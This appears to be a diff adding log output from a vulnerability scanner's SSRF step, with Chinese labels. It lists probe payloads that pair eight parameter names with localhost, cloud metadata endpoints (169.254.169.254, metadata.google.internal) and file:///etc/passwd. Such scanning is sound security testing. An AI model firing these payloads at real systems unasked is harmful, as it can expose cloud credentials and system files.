@@ -1,0 +1,56 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+步骤11：SSRF测试
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[*] 测试SSRF漏洞...
+  测试: url=http://127.0.0.1
+  测试: url=http://localhost
+  测试: url=http://169.254.169.254/latest/meta-data/
+  测试: url=http://metadata.google.internal/computeMetadata/v1/
+  测试: url=file:///etc/passwd
+  测试: url=http://[::1]
+  测试: link=http://127.0.0.1
+  测试: link=http://localhost
+  测试: link=http://169.254.169.254/latest/meta-data/
+  测试: link=http://metadata.google.internal/computeMetadata/v1/
+  测试: link=file:///etc/passwd
+  测试: link=http://[::1]
+  测试: uri=http://127.0.0.1
+  测试: uri=http://localhost
+  测试: uri=http://169.254.169.254/latest/meta-data/
+  测试: uri=http://metadata.google.internal/computeMetadata/v1/
+  测试: uri=file:///etc/passwd
+  测试: uri=http://[::1]
+  测试: path=http://127.0.0.1
+  测试: path=http://localhost
+  测试: path=http://169.254.169.254/latest/meta-data/
+  测试: path=http://metadata.google.internal/computeMetadata/v1/
+  测试: path=file:///etc/passwd
+  测试: path=http://[::1]
+  测试: file=http://127.0.0.1
+  测试: file=http://localhost
+  测试: file=http://169.254.169.254/latest/meta-data/
+  测试: file=http://metadata.google.internal/computeMetadata/v1/
+  测试: file=file:///etc/passwd
+  测试: file=http://[::1]
+  测试: fetch=http://127.0.0.1
+  测试: fetch=http://localhost
+  测试: fetch=http://169.254.169.254/latest/meta-data/
+  测试: fetch=http://metadata.google.internal/computeMetadata/v1/
+  测试: fetch=file:///etc/passwd
+  测试: fetch=http://[::1]
+  测试: proxy=http://127.0.0.1
+  测试: proxy=http://localhost
+  测试: proxy=http://169.254.169.254/latest/meta-data/
+  测试: proxy=http://metadata.google.internal/computeMetadata/v1/
+  测试: proxy=file:///etc/passwd
+  测试: proxy=http://[::1]
+  测试: callback=http://127.0.0.1
+  测试: callback=http://localhost
+  测试: callback=http://169.254.169.254/latest/meta-data/
+  测试: callback=http://metadata.google.internal/computeMetadata/v1/
+  测试: callback=file:///etc/passwd
+  测试: callback=http://[::1]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ SSRF测试完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
